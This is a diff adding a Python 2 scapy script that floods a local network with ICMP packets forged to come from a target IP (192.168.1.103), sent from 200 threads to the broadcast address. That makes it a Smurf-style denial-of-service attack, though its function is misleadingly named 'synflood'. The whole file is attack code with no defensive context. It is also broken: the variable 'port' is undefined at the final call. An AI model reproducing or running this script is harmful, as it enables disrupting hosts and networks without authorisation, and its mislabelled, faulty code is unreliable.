@@ -1,0 +1,24 @@
+from scapy.all import *
+from time import sleep
+import thread
+import random
+ 
+target = '192.168.1.103'
+threadnum = 200
+ 
+def synflood(target, port):
+ 
+    while True:
+ 
+        send(IP(src=target, dst="192.168.1.255")/ICMP(), count=100, verbose=0)
+ 
+def attack(target, port):
+ 
+    print "Start Attack..."
+ 
+    for i in range(threadnum):
+        thread.start_new_thread(synflood, (target, port))
+    while True:
+        sleep(1)
+ 
+attack(target, port)
